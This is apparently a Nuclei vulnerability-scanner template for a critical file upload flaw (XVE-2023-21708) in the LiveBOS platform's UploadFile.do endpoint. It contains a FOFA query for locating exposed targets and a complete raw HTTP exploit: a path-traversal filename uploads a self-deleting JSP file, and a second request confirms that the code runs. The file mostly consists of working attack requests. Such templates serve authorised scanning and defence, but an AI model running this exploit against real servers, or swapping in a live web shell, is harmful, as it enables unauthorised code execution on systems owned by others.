id: livebos-UploadFile-fileupload
info:
  name: livebos UploadFile - fileupload
  author: leadlife
  severity: critical
  description: 灵动业务架构平台(LiveBOS)系统UploadFile.do接口文件上传漏洞(XVE-2023-21708)
  reference: 
    - https://github.com/wy876/POC/blob/d672fb7281b8d68fde4cf142b81405f912fc51e6/%E7%81%B5%E5%8A%A8%E4%B8%9A%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%B9%B3%E5%8F%B0(LiveBOS)%E7%B3%BB%E7%BB%9FUploadFile.do%E6%8E%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(XVE-2023-21708).md
    - https://blog.csdn.net/weixin_53009585/article/details/140853891
  metadata:
    verified: true
    fofa-query: app="LiveBOS-框架" || body=“Power by LiveBOS”
  tags: livebos,fileupload

http:
  - raw:
      - |
        POST /feed/UploadFile.do;.js.jsp HTTP/1.1 
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi
        Connection: close
        
        ---WebKitFormBoundaryxegqoxxi
        Content-Disposition:form-data; name="file"; filename="/../../../../test.jsp"
        Content-Type: image/jpeg
        
        <%@ page import="java.io.File" %>
        <%
        out.println("{{randstr}}");
        String filePath = application.getRealPath(request.getServletPath());
        new File(filePath).delete();
        %>
        ---WebKitFormBoundaryxegqoxxi--

      - |
        GET /test.jsp;.js.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,"{{randstr}}")
        condition: and
